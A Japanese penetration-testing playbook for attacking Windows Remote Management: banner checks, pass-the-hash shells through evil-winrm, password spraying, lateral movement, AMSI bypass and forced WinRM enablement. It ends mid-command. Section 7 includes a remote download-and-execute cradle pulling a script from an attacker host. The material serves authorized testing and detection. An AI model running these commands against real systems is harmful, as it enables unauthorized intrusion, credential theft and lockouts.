# WinRM

> **スコープ: 5985（HTTP）/ 5986（HTTPS）ポートの列挙〜認証確認〜対話シェル取得・WinRM 経由の認証スプレー / Lateral movement / Persistence・関連既知 CVE まで**を 1 ファイルで扱う。Windows 環境で認証情報（パスワード / NTLM ハッシュ / Kerberos チケット）を取得した直後の **第一選択の対話シェル取得経路**。WinRM が閉じている場合の Impacket exec 経路は `./Protocol_Exploitation.md`、接続後の AD 列挙・横展開は `../04_Post_Access_Windows_AD/Enumeration_Checklist.md` を参照。

## 着火条件

以下のいずれかに該当する場合:

- ポートスキャンで `5985/tcp open wsman`（HTTP）または `5986/tcp open wsmans`（HTTPS）を検出
- Windows 環境で認証情報（パスワード / NTLM ハッシュ / Kerberos チケット）が取得済みで対話シェルを開きたい
- 既に侵入済みホストから AD 内の他ホストへ Lateral movement したい（§7）
- AD 環境でパスワードスプレー先として 5985 を使う（§8）

## 環境前提

- 実行環境: テスター端末（Linux または Windows どちらでも）
- 必要なツール:
  - **Linux 側**: `nmap` / `nxc`（NetExec の CLI ラッパー。SMB/WinRM/MSSQL への認証テストを一括で行う、ペネトレ用 Linux ディストリ標準搭載）/ `evil-winrm`（Ruby 製の WinRM 対話シェルクライアント、ペネトレ用 Linux ディストリ標準搭載 or `gem install evil-winrm`）/ `crackmapexec` または `cme`（nxc の前身。古い環境ではこちらしか入っていない）/ `pypsrp` または `pywinrm`（Python ライブラリ・スクリプト化用途）
  - **Windows 側**: `Test-WSMan` / `Invoke-Command` / `Enter-PSSession` / `New-PSSession`（PowerShell 標準・MS 純正）/ `winrs.exe`（cmd 互換クライアント）
- 外部リソース依存: なし（辞書・スプレー用パスワードリストはオフラインで完結）

## 先に確認すること

- **ロックアウト設定**: `Account_Lockout_Recon.md` の AD 節（`nxc smb --pass-pol` / `rpcclient getdompwinfo` で取得した `lockoutThreshold` を WinRM スプレーにも適用する）。WinRM 経由の失敗認証も同じ AD ロックアウトカウンタに加算される
- **管理者相当か否か**: WinRM に接続できるのは `Remote Management Users` または `Administrators` グループメンバーのみ。**認証成功 ≠ シェル取得**。`nxc winrm` の `(Pwn3d!)` 表示で先に判定する（§3）
- **5985 / 5986 のどちらが開いているか**: 5986（HTTPS）のみの環境では `evil-winrm -S` が必須（§4）
- **攻撃側端末が Windows / Linux のどちらか**: Linux 側なら evil-winrm / nxc / pypsrp、Windows 側なら PowerShell ネイティブ cmdlet（§6）を選ぶ

> 原理（WS-Management / SOAP over HTTP / http.sys カーネル共有 / SPNEGO 認証 negotiation / Kerberos SPN / TrustedHosts と NTLM Mutual Auth / 二重ホップ問題 / wsmprovhost.exe プロセスモデル）→ `../06_Concepts/WinRM_Protocol.md`。本ファイルでは挙動レベルで扱う。

**攻撃者の思考トレース:** WinRM は「Windows 環境での SSH」相当 — 対話シェル・ファイル転送・スクリプト実行が可能で、SMB ベースの psexec / wmiexec ほどイベントログ痕跡を残さない（サービス作成や WMI 呼び出しが入らない）。**認証情報が取れた瞬間に最初に試すべき経路**。`nxc winrm` で `(Pwn3d!)` が出れば 1 コマンドで対話シェル確定、出なくても認証は通っていればグループ追加経路 / 別ユーザー探索に進める。**辞書攻撃の起点としては薄い**（取得済み cred 試行が本命）— SSH と同じく「取れた cred を試す」スタンス。**侵入後は Invoke-Command で AD 内他ホストへ連鎖侵入できる**（§7）ため、Lateral movement の主要ハブにもなる。

---

## 1. バナー観察 / ポート判定

**コマンド:**

```bash
# [Attacker] nmap で WinRM ポートのバナー取得
nmap -sV -p 5985,5986 [TARGET_IP]
# 出力例:
# 5985/tcp open  http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
# 5986/tcp open  ssl/http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

# [Attacker] WinRM 専用 nmap スクリプト
nmap -p 5985 --script http-wsman-info [TARGET_IP]
nmap -p 5985 --script http-winrm-enum [TARGET_IP]

# [Attacker] WSMAN エンドポイントの応答確認（非認証で 401 が返ることを確認）
curl -sk -I http://[TARGET_IP]:5985/wsman
# HTTP/1.1 401
# WWW-Authenticate: Negotiate
# WWW-Authenticate: Basic realm="WSMAN"

# [Attacker] HTTPS 側
curl -sk -I https://[TARGET_IP]:5986/wsman
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `5985/tcp open` のみ | HTTP のみ有効（既定構成） | §3 nxc winrm 認証確認へ |
| `5986/tcp open` のみ | HTTPS のみ有効（強化構成） | §4 で `evil-winrm -S` 必須 |
| 5985 と 5986 両方 open | HTTP / HTTPS 並行（混在構成） | どちらでも接続可。検知回避なら HTTPS 側を優先 |
| `Microsoft HTTPAPI httpd 2.0` | Windows http.sys 由来 | OS は Windows 確定。`88` / `389` / `445` 等の AD ポートと組合せて DC か member かを推定 |
| 5985 が **Linux OS** のホストで開いている | **Azure Linux + OMI Agent の可能性** | §10 OMIGOD CVE-2021-38647 を確認 |
| `WWW-Authenticate: Negotiate` のみ（Basic なし）| NTLM / Kerberos のみ受理、Basic auth 無効化済み | パスワード平文の Basic 経路は使えない。`evil-winrm` は既定で Negotiate 使うので問題なし |
| `WWW-Authenticate: Basic` を含む | Basic auth 有効（HTTP 上で平文 cred 流れる構成、設定不備の finding 候補）| Basic 経路でも接続可。HTTPS 経路に切替を推奨記録 |
| `/wsman` で 404 / 接続拒否 | WinRM 自体が無効化 / 別パスに移動 | `./Protocol_Exploitation.md` の Impacket exec 経路（135 / 445）に切替 |

> **注意:** `Microsoft HTTPAPI httpd 2.0` のバナーは WinRM 専用ではない（IIS / WSDAPI など http.sys を使う他サービスでも出る）。ポート番号（5985 / 5986）で WinRM と確定する。`HTTPAPI` のバージョン番号は **OS バージョンと直結しない**（カーネルコンポーネントなので独立に更新される）ため、OS 判定の手掛かりにはならない。

> **Shodan dork:** インターネット越し WinRM 露出ホスト探索は `port:5985 Microsoft-HTTPAPI`。本番偵察では外部公開度の参考として使う（**実 exploit には許可必須**）。

---

## 2. 認証方式の確認（Negotiate / Kerberos / Basic / CredSSP）

**コマンド:**

```bash
# [Attacker] WSMAN エンドポイントから WWW-Authenticate ヘッダを抽出
curl -sk -I http://[TARGET_IP]:5985/wsman | grep -i 'WWW-Authenticate'
# WWW-Authenticate: Negotiate
# WWW-Authenticate: Basic realm="WSMAN"
# WWW-Authenticate: Kerberos

# [Attacker] AD 環境で Kerberos 認証を強制する場合の事前 kinit
kinit [USER]@[DOMAIN.UPPER]
klist
# Default principal: [USER]@[DOMAIN.UPPER]
# Valid starting       Expires              Service principal
# ...                  ...                  krbtgt/[DOMAIN.UPPER]@[DOMAIN.UPPER]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Negotiate` のみ | NTLM / Kerberos のみ受理（既定の堅い構成）| `evil-winrm -u [USER] -p [PASSWORD]` で接続（Negotiate 経由で自動的に NTLM 試行）|
| `Negotiate` + `Kerberos` | Kerberos 単独受理経路あり、AD 環境 | `kinit` 済みなら `evil-winrm -k --spn HTTP/[TARGET_FQDN]` で Kerberos 経路（NTLM 無効化環境で有効）|
| `Basic realm="WSMAN"` を含む | Basic auth 有効（設定不備の finding 候補）| 平文 cred 流れる経路、HTTP 5985 上の Basic 経路では MitM 経路で cred キャプチャの懸念。検出時は finding として記録 |
| `CredSSP` を含む | CredSSP 認証有効（二段委任あり）| 既存 cred の他ホスト委任が可能、二重ホップ問題回避に使える（§7 Lateral movement で活きる） |
| すべての方式が拒否 / 401 が返らない | エンドポイント自体に到達できていない（FW / IP 制限）| 接続元 IP を変える / `./Protocol_Exploitation.md` の Impacket exec 経路（445）に切替 |

> **NTLM 無効化環境の見分け方:** Kerberos のみ受理する設定は AD 強化構成で増えている（Microsoft 推奨）。`Negotiate` だけ返っていても、内部で Kerberos のみが許可されていると NTLM 認証は `STATUS_LOGON_FAILURE` で拒否される。**`kinit` で TGT 取得 → `evil-winrm -k --spn HTTP/[TARGET_FQDN]` を試す** か、Kerberos チケットを取得済みなら Pass-The-Ticket 経路（`../04_Post_Access_Windows_AD/Kerberos_Attacks/Pass_The_Ticket.md`）へ。

---

## 3. nxc winrm による認証確認・(Pwn3d!) 判定

**コマンド:**

```bash
# [Attacker] パスワード認証で接続確認
nxc winrm [TARGET_IP] -u [USER] -p '[PASSWORD]'

# [Attacker] NTLM ハッシュ（Pass-The-Hash）
nxc winrm [TARGET_IP] -u [USER] -H '[NTLM_HASH]'

# [Attacker] ドメイン指定
nxc winrm [TARGET_IP] -u [USER] -p '[PASSWORD]' -d [DOMAIN]

# [Attacker] コマンド実行も同時に（シェル取得せず 1 発実行）
nxc winrm [TARGET_IP] -u [USER] -p '[PASSWORD]' -x 'whoami /all'
nxc winrm [TARGET_IP] -u [USER] -H '[NTLM_HASH]' -X '$PSVersionTable'   # -X は PowerShell
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[+] [DOMAIN]\[USER]:[PASSWORD] (Pwn3d!)` | 認証成功 + `Remote Management Users` または `Administrators` メンバー | §4 evil-winrm で対話シェル取得 |
| `[+] [DOMAIN]\[USER]:[PASSWORD]` だが `(Pwn3d!)` **なし** | 認証は通るが WinRM 接続権限がない（グループ外）| グループ追加経路（GenericWrite 等の ACE）/ 別ユーザー探索。`../05_Tools_Reference/BloodHound.md` で `Remote Management Users` グループの member / writable ACE を辿る |
| `[-] [DOMAIN]\[USER]:[PASSWORD] STATUS_LOGON_FAILURE` | 認証情報が不正 | 認証情報を再確認 / ドメイン指定の有無 / NetBIOS vs FQDN の組合せ違いを試行 |
| `[-] ... STATUS_ACCOUNT_LOCKED_OUT` | アカウントロック発動 | **即停止**。`Account_Lockout_Recon.md` で観察期間を確認、ロック解除を待つ |
| `[-] ... STATUS_PASSWORD_EXPIRED` | パスワード期限切れ（認証は通っている）| そのユーザーで RDP 等から強制パスワード変更経路があるか確認 |
| 接続自体がタイムアウト | FW で 5985 ブロック / IP 制限 | §1 で 5986 が開いていないか確認、別経路（135 / 445）を検討 |

> **`(Pwn3d!)` の意味:** nxc が接続後に対話シェル相当の権限を確認できた状態。具体的には WinRM の `winrs` レベルでコマンド実行できる権限（`Remote Management Users` グループメンバー以上）。これが出ない場合、認証は通っているがシェルは取れない。

> **crackmapexec / cme との互換性:** `nxc` は NetExec のリブランド版（2023〜）。**古い環境では `crackmapexec winrm` / `cme winrm` が同等のコマンド体系で動く**。フラグはほぼ互換（`-u` / `-p` / `-H` / `-d` / `-x` / `-X`）。スプレーは「nxc winrm」 = 「crackmapexec winrm」と読み替え可能。

---

## 4. evil-winrm による対話シェル取得（Linux 攻撃端末から）

**コマンド:**

```bash
# [Attacker] パスワード認証（5985 / HTTP 既定）
evil-winrm -i [TARGET_IP] -u [USER] -p '[PASSWORD]'

# [Attacker] NTLM ハッシュ認証（Pass-The-Hash）
evil-winrm -i [TARGET_IP] -u [USER] -H '[NTLM_HASH]'

# [Attacker] 5986（HTTPS）側で開いている場合
evil-winrm -i [TARGET_IP] -u [USER] -p '[PASSWORD]' -S

# [Attacker] Kerberos 認証（evil-winrm v3.x 以降・事前 kinit 済み）
RHOST=[TARGET_IP] evil-winrm -i $RHOST -u [USER] -k --spn HTTP/[TARGET_FQDN]

# [Attacker] 証明書ベース認証（v3.x 以降）
evil-winrm -i [TARGET_IP] --cert-pem [CERT_FILE] --key-pem [KEY_FILE]

# [Attacker] ローカル PS スクリプトディレクトリ / 実行ファイルディレクトリを指定（Invoke-Binary / menu で使う）
evil-winrm -i [TARGET_IP] -u [USER] -p '[PASSWORD]' -s /path/to/scripts/ -e /path/to/exes/

# [Attacker] セッションロギング（v3.x・本番証跡用）
evil-winrm -i [TARGET_IP] -u [USER] -p '[PASSWORD]' -L

# [Attacker] リモートパス補完無効化（v3.x・連続 Tab で遅延が起きる環境向け）
evil-winrm -i [TARGET_IP] -u [USER] -p '[PASSWORD]' -N

# [Attacker] IPv6 ターゲット — `/etc/hosts` にドメイン名を割り当てて接続
echo '[IPv6_ADDR] target.example.test  # kedalab-[CASE_ID]' | sudo tee -a /etc/hosts
evil-winrm -i target.example.test -u [USER] -p '[PASSWORD]'
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Evil-WinRM shell v[X.Y]` + `*Evil-WinRM* PS C:\Users\[USER]\Documents>` | シェル取得成功 | §5 接続後の制約 / 列挙へ |
| `Failed to authenticate. The user provided invalid credentials` | 認証情報が不正 / ハッシュ形式不正 | NTLM ハッシュは `LM:NT` 形式または NT のみ（32 桁 hex）の両方を試す |
| `Failed to authenticate. NTLM is disabled on this machine` | NTLM 認証が無効化されている | §2 で Kerberos が有効か確認、`kinit` + `-k --spn HTTP/[FQDN]` 経路へ |
| `Error: An empty hostname is not valid` | `-i` の引数欠落 | コマンド構文を確認 |
| 接続できるが即切断 / `Error: Address [IP]:5985: connection refused` | HTTPS のみ有効、HTTP 5985 が無効 | `-S` を付けて 5986 経由で再試行 |
| `OpenSSL::SSL::SSLError` | TLS 検証エラー（自己署名証明書）| 既定で evil-winrm は証明書検証を緩めに扱うが、明示的に skip する場合は最新版オプションを確認 |
| `WinRMHTTPTransportError ... 401` | 認証は通らない（Negotiate 拒否）| Kerberos 強制環境、§2 経路へ |

> **NTLM ハッシュ形式の注意:** `-H` には NT ハッシュ（32 桁 hex）単独、または `LM:NT` の両方が通る。**LM 部分は空でも問題ない**が、`:NT` 形式（先頭にコロン）として渡す必要があるツールもある（impacket 系）。evil-winrm は単独 32 桁 NT を直接受け取る。

> **`-s` / `-e` オプションの意味:** evil-winrm の `menu` コマンドや `Invoke-Binary` / `Bypass-4MSI` 等の機能で攻撃側ホストにあるスクリプト / バイナリを **メモリ上で実行**するためのローカルディレクトリ指定。AMSI バイパス済み環境では PowerView / SharpHound / Rubeus 等を直接メモリ実行できる（§5 参照）。

**その他のクライアント（代替手段）:**

| クライアント | 用途 | 入手 |
|---|---|---|
| `pypsrp` (Python) | CredSSP / Kerberos 対応、スクリプト化用途 | `pip install pypsrp` |
| `pywinrm` (Python) | シンプル・古典 | `pip install pywinrm` |
| `quickbreach/powershell-ntlm` (Docker) | Linux から PowerShell + NTLM で接続 | `docker run -it quickbreach/powershell-ntlm` |
| `winrm-fs` ベース Ruby script | 対話シェル + UPLOAD コマンド対応（カスタム） | alamot 公開コード |

evil-winrm が EDR で検知される環境では pypsrp / Docker クライアント / Windows ネイティブ（§6）に切替。

---

## 5. evil-winrm 接続後の制約とファイル転送

**観測される挙動 → 次のアクション:**

| 接続直後の状態 / 試行コマンド | 示唆 | 次のアクション |
|---|---|---|
| プロンプトが `C:\Users\[USER]\Documents>` から始まる | WinRM の既定 cwd は `Documents`（**Desktop ではない**）| `cd ..\Desktop` または `cd C:\Users\[USER]\Desktop` を使う。`cd Desktop` は `Cannot find path` エラー |
| ターゲット側で `wsmprovhost.exe` プロセスが起動 | WinRM セッションホストプロセス | Sysmon / EDR の Event ID 1 で `wsmprovhost.exe` の親（`svchost.exe -k DcomLaunch`）と子（実行コマンド）が記録される |
| `tree /f` で大量出力 | フォルダ構造が把握できる | `Get-ChildItem -Recurse` より cmd の `tree /f` が見やすい（WinRM 経由でも動く）|
| `Start-Process` / GUI 起動が反応なし | WinRM は **対話入力を要するコマンドが動かない**（PSSession の制約）| GUI 系・対話入力系は別経路（RDP / VNC）、または PowerShell 引数で完結する形に書き換える |
| `whoami /priv` で SeImpersonate / SeAssignPrimaryToken | サービスアカウント相当の特権あり | `../04_Post_Access_Windows_AD/Privilege_Tokens.md` の Potato 系 SYSTEM 昇格へ |
| evil-winrm で `menu` 実行 | upload / download / Invoke-Binary 等のメニュー表示 | ファイル転送・メモリ実行が可能 |
| evil-winrm で `upload /local/path C:\target\path` | 攻撃側からターゲットへファイル転送 | PE / スクリプトを置く必要があるとき（`certutil` / `IWR` の代替）|
| evil-winrm で `download C:\target\path /local/path` | ターゲットから攻撃側へファイル取得 | 設定ファイル・ログ・SAM ハイブ等の持ち出し |
| evil-winrm で `Invoke-Binary /path/to/PEAS.exe` | `-e` で指定したディレクトリの PE をメモリ実行 | AMSI / Defender 回避が必要（`Bypass-4MSI` を先に実行）|

**接続後すぐに実行する列挙コマンド（テンプレ）:**

```powershell
# [Target] PS prompt 上で
whoami
whoami /all
whoami /priv
hostname
[System.Environment]::OSVersion
Get-ComputerInfo | Select-Object -Property WindowsProductName, WindowsVersion, OsBuildNumber, OsHardwareAbstractionLayer
net user [USER]
net localgroup Administrators
net localgroup "Remote Management Users"
ipconfig /all
```

> **シェル安定化の必要性:** evil-winrm 経由のシェルは PSSession ベースで既に「安定」している（reverse shell の TTY upgrade のような追加処理は不要）。**`stty raw -echo` / `python3 pty.spawn` 等は WinRM では不要**。シェル安定化が必要なのは Linux の reverse shell（`../03_Post_Access_Linux/Shell_Stabilization.md`）であり、WinRM では混同しないこと。

> **AMSI / Defender 注意:** evil-winrm の `Invoke-Binary` でメモリ実行する PE が AMSI / Defender で検知される場合がある。事前に `Bypass-4MSI` を実行（evil-winrm 内蔵）するか、`../04_Post_Access_Windows_AD/Enumeration_Checklist.md` の AMSI バイパス節を参照。**本番では AMSI バイパスは原則禁止または個別合意必須**（HIGH IMPACT 警告）。

---

## 6. Windows ネイティブ PSRemoting 経路（攻撃側 Windows から）

**着火条件:** 攻撃端末が Windows（ジャンプサーバー / 既に侵入した Windows ホスト / 検証 PC）。Microsoft 純正 cmdlet のみ使用するため、**evil-winrm が EDR で検知される環境での defense evasion 代替**として有効。

**コマンド:**

```powershell
# [Attacker-Windows] WinRM 設定確認（接続性テスト）
Test-WSMan [TARGET_IP]
# 出力例（成功時）: wsmid: http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd / ProtocolVersion: ...
# 出力例（失敗時）: 詳細情報なし → ターゲット側で WinRM 無効

# [Attacker-Windows] 攻撃側で WinRM クライアント有効化 + TrustedHosts に追加
# （domain joined でない / HTTP 経路で接続する場合に必要）
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts '*'    # ワイルドカード（広めの設定・要注意）
# 個別指定する場合:
Set-Item wsman:\localhost\client\trustedhosts '[TARGET_HOSTNAME1],[TARGET_HOSTNAME2]'

# [Attacker-Windows] cred 作成
$password = ConvertTo-SecureString '[PASSWORD]' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[USER]', $password)
# ローカルユーザー指定（"\\" 形式）:
$creds_local = New-Object System.Management.Automation.PSCredential('.\[USER]', $password)

# [Attacker-Windows] (1) Invoke-Command で 1 回限りリモート実行
Invoke-Command -ComputerName [TARGET_FQDN] -Credential $creds -ScriptBlock { ipconfig /all }

# [Attacker-Windows] (2) ローカル関数 / スクリプトのリモート実行
function Enumerate { Get-LocalUser; Get-Process }
Invoke-Command -ComputerName [TARGET_FQDN] -Credential $creds -ScriptBlock ${function:Enumerate}
Invoke-Command -ComputerName [TARGET_FQDN] -Credential $creds -FilePath C:\local\scripts\enum.ps1

# [Attacker-Windows] (3) Enter-PSSession で対話セッション
Enter-PSSession -ComputerName [TARGET_FQDN] -Credential $creds
# プロキシ無効化が必要な場合:
Enter-PSSession -ComputerName [TARGET_FQDN] -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)

# [Attacker-Windows] (4) 永続セッションを変数に保存して再利用
$sess = New-PSSession -ComputerName [TARGET_FQDN] -Credential $creds
Enter-PSSession -Session $sess
# 別ウィンドウからもアクセス可
Invoke-Command -FilePath C:\local\scripts\loader.ps1 -Session $sess
Exit-PSSession   # バックグラウンド化（$sess は残る）
Remove-PSSession $sess   # 終了

# [Attacker-Windows] (5) winrs.exe — cmd 互換クライアント
winrs -r:http://[TARGET_FQDN]:5985 -u:[DOMAIN]\[USER] -p:[PASSWORD] cmd
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `Test-WSMan` で wsmid / ProtocolVersion が返る | ターゲット側 WinRM 有効・接続可能 | `Enter-PSSession` または `Invoke-Command` へ |
| `Test-WSMan` で「指定されたサービスに接続できません」| WinRM 未設定 / FW ブロック | §1 nmap / Curl で再確認、必要なら §9 強制有効化を検討 |
| `Enter-PSSession ... The WinRM client cannot process the request ... TrustedHosts` | 攻撃側マシンの TrustedHosts に未登録 | `winrm quickconfig` + `winrm set winrm/config/client '@{TrustedHosts="..."}'` |
| `Enter-PSSession ... Access is denied` | 認証通らない / 権限不足 | 別 cred / Kerberos 認証へ |
| プロンプトが `[TARGET]: PS C:\Users\[USER]\Documents>` | リモート PSSession 確立 | 接続後の活動へ（§5 列挙テンプレと同じ） |
| `wsmprovhost.exe` がターゲット側で起動 | PSSession プロセスが立っている | 検知側からは Event ID 1 でこのプロセスツリーが見える |

> **`-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)`:** 企業プロキシ環境で WinRM 接続がプロキシ経由になってしまう問題の回避策。攻撃側マシンが企業ネットワークの場合に必要。

> **TrustedHosts エラー対処:** ドメイン参加していない攻撃端末（個人 PC / 検証 VM）からの WinRM 接続では Kerberos が使えず、NTLM 認証時に「TrustedHosts に追加されていない」エラーが出る。対処は以下のいずれか:
>
> - **HTTPS（5986）経由で接続する**（証明書検証で代替）
> - **`Enable-PSRemoting -Force` + `Set-Item wsman:\localhost\client\trustedhosts '*'`** で全ホストを信頼（**広すぎる設定・本番では危険**）
> - `winrm quickconfig` + `winrm set winrm/config/client '@{TrustedHosts="[TARGET_HOSTNAME]"}'` で個別指定

> **wsmprovhost.exe は WinRM の代表的検知シグネチャ:** ターゲット側で `wsmprovhost.exe` がコマンド実行プロセスの親になることが Sysmon Event ID 1 / EDR の主要観察点。**接続自体は隠せない**ため、Defense evasion は「接続事実を隠す」ではなく「**接続後の挙動を MS 純正ツール範囲に留める**」方向で考える（カスタム PE 投下を避け、Get-WmiObject / Get-CimInstance / PowerView の Invoke-Command 越し実行に留めるなど）。

---

## 7. WinRM 経由 Lateral Movement（侵入済みホストから AD 内他ホストへ）

**着火条件:** 既に WinRM / SMB / 他経路で Windows ホストにシェル取得済み。**同じ cred（または Kerberos チケット）で AD 内他ホストへ Invoke-Command で連鎖侵入**したい。

**コマンド:**

```powershell
# [Compromised-Host] 現在の cred で他ホスト一斉スキャン
$targets = @('SRV01', 'SRV02', 'WORKSTATION03')
foreach ($t in $targets) {
    try {
        $result = Invoke-Command -ComputerName $t -ScriptBlock { hostname; whoami } -ErrorAction Stop
        Write-Host "[+] $t : $result"
    } catch {
        Write-Host "[-] $t : $($_.Exception.Message)"
    }
}

# [Compromised-Host] 別 cred を使った Lateral movement
$password = ConvertTo-SecureString '[OTHER_PASSWORD]' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[OTHER_USER]', $password)
Invoke-Command -ComputerName [NEXT_HOST] -Credential $creds -ScriptBlock { Get-Process }

# [Compromised-Host] PS Remoting reverse shell（cradle）
Invoke-Command -ComputerName [NEXT_HOST] -Credential $creds -ScriptBlock {
    cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://[ATTACKER_IP]:8080/[script_name].ps1')"
}

# [Compromised-Host] CredSSP で二重ホップ回避（事前に CredSSP 設定が必要）
# A → B → C で B にも cred を委任して C まで連鎖
Enter-PSSession -ComputerName [HOP_B] -Authentication CredSSP -Credential $creds
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 複数ターゲットで `[+]` が返る | 同じ cred が複数ホストで通る（cred の再利用が広い）| 横展開連鎖の対象ホスト確定。BloodHound でグラフ確認 |
| 一部のみ `[+]` | 製品差・グループメンバーシップ差 | 各ホストの `Remote Management Users` メンバーシップを `Get-LocalGroupMember` で確認 |
| 全部 `Access is denied` | 現在の cred は対象ホストに権限なし | 別 cred / SeImpersonate 経由の Token Impersonation 等 |
| Invoke-Command 越しに `\\[FILESERVER]\share` アクセス時 `Access is denied` | **二重ホップ問題**：PSSession 内で取得した cred が更に別サービスへ委任できない | `-Authentication CredSSP` または Resource-Based Constrained Delegation 等で回避 |
| Reverse shell cradle が AMSI でブロック | スクリプトのインライン展開で検知 | Base64 化 / 文字列分割 / AMSI バイパスを先に実行 |

> **二重ホップ問題（Double-Hop Problem）の本質:** PSSession で取得した cred は **「PSSession 接続先のホスト」までしか委任されない**（既定の Kerberos delegation 設定）。そのため `A → PSSession → B` の B 上から `\\C\share` にアクセスしたり Invoke-Command で C へ飛ぶと、B が C に対して匿名アクセスになって失敗する。**回避策**:
>
> - `-Authentication CredSSP`（cred を平文に近い形で B に渡す・**HIGH IMPACT** — B が侵害されると cred 漏洩）
> - Resource-Based Constrained Delegation（RBCD）で B が C にチケットを要求できるよう構成
> - Pass-The-Ticket で C 向けチケットを別途取得して B にインポート

> **検知側の観察点:** Lateral movement では複数ホストの `wsmprovhost.exe` + 親が `svchost.exe` のチェーンが時系列で並ぶ。SIEM 側の `Microsoft-Windows-WinRM/Operational` Event 91 / 163（shell created）の横展開パターンが代表的シグネチャ。

---

## 8. WinRM 経由の認証スプレー

**事前準備（必須）:** `Account_Lockout_Recon.md` で AD のロックアウト閾値（`lockoutThreshold` / `lockoutObservationWindow` / `lockoutDuration`）を取得し、試行間隔を設計する。WinRM の失敗認証も AD カウンタに加算される。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] 業務停止リスク（アカウントロック発動でユーザーがログイン不能に）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM / EDR で確実に検知される（Event ID 4625 大量、Event ID 4624 LogonType 3、`Microsoft-Windows-WinRM/Operational` Event 182 大量、Security Event 4262 で source IP も記録される）
>
> 実施可否は事前合意で明示確認すること。演習環境（HTB / OSCP 等）では制約なし。

**コマンド:**

```bash
# [Attacker] 1 ユーザー × 複数パスワード（パスワード辞書攻撃）
nxc winrm [TARGET_IP] -u [USER] -p passwords.txt --continue-on-success

# [Attacker] 複数ユーザー × 1 パスワード（パスワードスプレー、ロックアウトリスク最小）
nxc winrm [TARGET_IP] -u users.txt -p '[PASSWORD]' --continue-on-success

# [Attacker] 複数ユーザー × 複数パスワード（全数試行、最もリスク大）
nxc winrm [TARGET_IP] -u users.txt -p passwords.txt --continue-on-success

# [Attacker] ハッシュスプレー（NTLM ハッシュ流用先探索）
nxc winrm [TARGET_IP] -u users.txt -H '[NTLM_HASH]' --continue-on-success

# [Attacker] crackmapexec / cme でも同等
crackmapexec winrm [TARGET_IP] -d [DOMAIN] -u users.txt -p passwords.txt --continue-on-success
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `[+] [DOMAIN]\[USER]:[PASSWORD] (Pwn3d!)` が出る | 認証 + シェル取得権限の組合せ確定 | §4 で `evil-winrm` 接続へ |
| `[+] [DOMAIN]\[USER]:[PASSWORD]` のみ（`(Pwn3d!)` なし）| 認証は通るがシェル取得不可 | 別ホストの WinRM / SMB / RDP で同じ cred を試す（cred 使い回し確認）|
| `STATUS_ACCOUNT_LOCKED_OUT` 大量発生 | スプレー設計失敗、ロックアウト発動 | **即停止**。観察期間 +buffer で再設計、または別経路に切替 |
| `STATUS_LOGON_FAILURE` のみで終了 | 全 cred / hash 不正 | ユーザーリスト見直し（NetBIOS vs FQDN、`@domain` 付きフォーマット） |
| `STATUS_PASSWORD_MUST_CHANGE` | 初回パスワード強制変更状態のアカウント発見 | 該当アカウントで RDP 経由のパスワード変更経路があるか確認 |
| 試行が極端に遅い | 接続レート制限（FW / IPS）| `--threads 1` + sleep 設計、または別 IP からの試行 |

> **`--continue-on-success` の意味:** デフォルトでは認証成功した瞬間に nxc は試行停止する（被害最小化のため）。スプレー時には「全 cred を試して全成功を列挙したい」ため、明示的に成功後も継続するフラグ。**ロックアウトリスクと検知量を増やすトレードオフあり**。

> **SMB スプレーとの併用:** 同じユーザーリストで `nxc smb` も並行して試すと、5985 が閉じている / 認証方式が異なる環境でもヒットすることがある。**ただしロックアウトカウンタは共通**なので、両方同時試行ではなく順次試行する。

> **hydra での代替:** `nxc` / `crackmapexec` が使えない環境では hydra でも brute 可能（`hydra winrm-ssl://` / `hydra -L users.txt -P passwords.txt rdp://[IP]` 類似）。ただし WinRM 用モジュールは hydra のメインラインでは限定的なので、`pywinrm` ベースの自前スクリプトの方が確実。

---

## 9. WinRM 強制有効化 / Persistence

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須:
> - [x] **持続化に該当**（一度有効化した WinRM は明示的に無効化しない限り再起動後も残る）
> - [x] **不可逆な設定変更を含む**（既定で無効の Windows クライアント OS で WinRM を有効化することは構成変更）
> - [ ] 業務停止リスク
> - [x] SIEM / EDR で確実に検知される（`Enable-PSRemoting` 実行ログ・Event ID 4697 サービス作成）
>
> 実施可否は事前合意で明示確認すること。**原状回復必須**（`Disable-PSRemoting -Force` + ファイアウォール規則削除）。演習環境（HTB / OSCP 等）では制約なし。

### 9.1 攻撃側マシンで WinRM クライアントを有効化（前提設定）

```powershell
# [Attacker-Windows] WinRM クライアント有効化（攻撃側マシン）
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts '*'
# ネットワーク種別を Private/Domain にする必要がある場合:
Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private
```

### 9.2 ターゲット側で WinRM を強制有効化（管理者権限が必要）

```powershell
# [Compromised-Host] 既に管理者権限あり、対象は WinRM 無効
Enable-PSRemoting -Force
# - 5985 listener 作成
# - WinRM サービス起動 + 自動起動設定
# - ファイアウォール規則追加（Windows Remote Management）

# [Attacker] リモートから wmic 経由で WinRM 有効化
wmic /node:[TARGET_HOST] /user:[DOMAIN]\[USER] /password:[PASSWORD] \
